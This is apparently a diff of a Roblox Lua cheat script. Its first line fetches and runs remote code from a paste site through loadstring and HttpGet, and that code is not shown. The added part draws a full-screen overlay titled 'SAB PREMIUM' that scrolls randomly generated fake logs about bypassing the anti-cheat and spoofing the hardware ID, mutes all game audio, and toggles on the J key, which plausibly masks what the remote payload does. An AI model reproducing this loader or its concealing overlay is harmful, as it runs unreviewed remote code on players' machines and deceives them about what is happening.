@@ -1,1 +1,106 @@
 loadstring(game:HttpGet("https://pastefy.app/G7AzYhX8/raw"))()
+--[[ 
+    SAB PREMIUM - VERSION PROGRESSIVE
+    Apparition ligne par ligne + Silence Total
+]]
+
+if not game:IsLoaded() then game.Loaded:Wait() end
+local p = game.Players.LocalPlayer
+local pg = p:WaitForChild("PlayerGui")
+local uis = game:GetService("UserInputService")
+
+if pg:FindFirstChild("SAB_PREMIUM_FINAL") then pg.SAB_PREMIUM_FINAL:Destroy() end
+
+local sg = Instance.new("ScreenGui")
+sg.Name = "SAB_PREMIUM_FINAL"
+sg.IgnoreGuiInset = true
+sg.DisplayOrder = 999999
+sg.Parent = pg
+
+local f = Instance.new("Frame")
+f.Size = UDim2.new(1, 0, 1, 0)
+f.BackgroundColor3 = Color3.fromRGB(2, 2, 2)
+f.BorderSizePixel = 0
+f.Parent = sg
+
+-- Liste de mots pour générer des variantes à l'infini
+local verbs = {"INJECTING", "BYPASSING", "LOADING", "ENCRYPTING", "OPTIMIZING", "HOOKING", "FETCHING", "SPOOFING", "CLEANING", "DECRYPTING"}
+local targets = {"ANTI_CHEAT", "KERNEL_DATA", "RENDER_ENGINE", "MEMORY_STREAM", "LOCAL_CLIENT", "SERVER_SIDE", "BYFRON_MODULE", "PACKET_FLOW", "HWID_DATA", "REMOTES"}
+local status = {"[OK]", "[SUCCESS]", "[ACTIVE]", "[READY]", "[STABLE]", "[DONE]"}
+
+-- Conteneur pour les logs
+local logContainer = Instance.new("ScrollingFrame")
+logContainer.Size = UDim2.new(0.5, 0, 0.8, 0)
+logContainer.Position = UDim2.new(0.05, 0, 0.1, 0)
+logContainer.BackgroundTransparency = 1
+logContainer.ScrollBarThickness = 0
+logContainer.Parent = f
+
+local layout = Instance.new("UIListLayout")
+layout.VerticalAlignment = Enum.VerticalAlignment.Bottom
+layout.Parent = logContainer
+
+-- Titre SAB PREMIUM
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(0, 400, 0, 50)
+title.Position = UDim2.new(0.75, -200, 0.5, -25)
+title.BackgroundTransparency = 1
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextSize = 35
+title.Font = Enum.Font.Code
+title.Text = "SAB PREMIUM"
+title.Parent = f
+
+-- Gestion du Silence
+local isMuted = true
+local function killAudio()
+    for _, v in pairs(game:GetDescendants()) do
+        if v:IsA("Sound") then v.Volume = 0 end
+    end
+end
+game.DescendantAdded:Connect(function(v) if isMuted and v:IsA("Sound") then v.Volume = 0 end end)
+killAudio()
+
+-- Fonction pour ajouter une ligne lentement
+local function addNewLog()
+    local log = Instance.new("TextLabel")
+    log.Size = UDim2.new(1, 0, 0, 18)
+    log.BackgroundTransparency = 1
+    log.TextColor3 = Color3.fromRGB(0, 255, 140)
+    log.TextSize = 13
+    log.Font = Enum.Font.Code
+    log.TextXAlignment = Enum.TextXAlignment.Left
+    log.TextTransparency = 1 -- On commence invisible
+    
+    local randomText = status[math.random(#status)] .. " " .. verbs[math.random(#verbs)] .. "_" .. targets[math.random(#targets)]
+    log.Text = "> " .. randomText .. " ... 0x" .. string.upper(string.format("%x", math.random(1e5, 9e5)))
+    log.Parent = logContainer
+    
+    -- Animation d'apparition (Fade in)
+    game:GetService("TweenService"):Create(log, TweenInfo.new(0.3), {TextTransparency = 0}):Play()
+
+    -- Nettoyage pour éviter le lag
+    if #logContainer:GetChildren() > 30 then
+        logContainer:GetChildren()[2]:Destroy()
+    end
+end
+
+-- Boucle de génération lente et réaliste
+task.spawn(function()
+    while true do
+        if isMuted then
+            addNewLog()
+            killAudio() -- Sécurité son constante
+        end
+        task.wait(math.random(0.4, 0.9)) -- Délai entre chaque ligne (lent)
+    end
+end)
+
+-- Touche J pour Toggle
+uis.InputBegan:Connect(function(input, gpe)
+    if not gpe and input.KeyCode == Enum.KeyCode.J then
+        isMuted = not isMuted
+        f.Visible = isMuted
+        if isMuted then killAudio() end
+    end
+end)
